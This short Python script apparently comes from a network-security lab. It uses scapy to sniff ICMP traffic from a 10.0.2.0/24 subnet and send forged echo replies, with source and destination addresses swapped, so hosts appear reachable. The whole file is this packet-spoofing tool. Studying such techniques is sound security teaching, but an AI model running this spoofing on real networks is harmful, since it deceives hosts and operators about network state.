#!/usr/bin/python

from  scapy.all import *

b = ICMP(type=0)

def spoof_pkt(pkt):

   src = pkt[IP].src
   des = pkt[IP].dst
   send(IP(dst=src,src=des)/b)

pkt = sniff(filter="icmp and src net 10.0.2.0/24",prn=spoof_pkt)